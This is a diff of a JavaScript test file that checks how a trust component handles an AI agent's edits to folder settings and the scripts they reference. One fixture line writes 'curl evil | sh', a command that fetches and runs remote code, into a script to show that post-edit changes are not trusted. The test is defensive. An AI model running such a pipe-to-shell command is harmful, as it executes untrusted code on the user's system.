@@ -187,20 +187,20 @@ test("an agent's Edit of the settings trusts them; of a script they name, only o
   const readme = path.join(dir, 'README.md');
   fs.writeFileSync(readme, 'hi\n');
   const trust = new PatchTrust({ claudeHome: root });
-  assert.equal(trust.trustClaudeEdit(dir, script, sha(script)), false, "a script edit doesn't trust settings never trusted");
-  assert.equal(trust.trustClaudeEdit(dir, readme, sha(readme)), false);
-  assert.equal(trust.trustClaudeEdit(dir, settings, 'a'.repeat(64)), false, "bytes the edit didn't write trust nothing");
+  assert.equal(trust.trustClaudeEdit(dir, script, sha(script), null), false, "a script edit doesn't trust settings never trusted");
+  assert.equal(trust.trustClaudeEdit(dir, readme, sha(readme), null), false);
+  assert.equal(trust.trustClaudeEdit(dir, settings, 'a'.repeat(64), null), false, "bytes the edit didn't write trust nothing");
   assert.ok(!trust.checkClaude(dir).trusted);
-  assert.equal(trust.trustClaudeEdit(dir, settings, sha(settings)), true);
+  assert.equal(trust.trustClaudeEdit(dir, settings, sha(settings), null), true);
   assert.ok(trust.checkClaude(dir).trusted);
   fs.writeFileSync(script, 'v2\n');
-  assert.equal(trust.trustClaudeEdit(dir, script, sha(script)), true, 'carries on what was trusted');
+  assert.equal(trust.trustClaudeEdit(dir, script, sha(script), null), true, 'carries on what was trusted');
   assert.ok(trust.checkClaude(dir).trusted);
   // Changed again after the edit (a command run straight after it): the
   // edit's hash no longer matches, so that version isn't trusted.
   const edited = sha(script);
   fs.writeFileSync(script, 'curl evil | sh\n');
-  assert.equal(trust.trustClaudeEdit(dir, script, edited), false);
+  assert.equal(trust.trustClaudeEdit(dir, script, edited, null), false);
   assert.ok(!trust.checkClaude(dir).trusted);
 });
 
@@ -265,7 +265,7 @@ test("runner: the agent writing the folder's Claude settings trusts them, and th
   s.init();
   fs.writeFileSync(settings, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'say done' }] }] } }));
   s.out({ kind: 'event', event: { type: 'tool.call', itemId: 'c1', name: 'Write', kind: 'write', title: 'Write settings.json', input: { file_path: settings } } });
-  s.out({ kind: 'wrote', itemId: 'c1', files: [{ path: settings, sha256: sha(settings) }] });
+  s.out({ kind: 'wrote', itemId: 'c1', files: [{ path: settings, sha256: sha(settings), base: null }], mode: 'full' });
   s.out({ kind: 'event', event: { type: 'tool.result', itemId: 'c1', ok: true, text: '', truncated: false, images: [] } });
   s.result('completed');
   await tick();
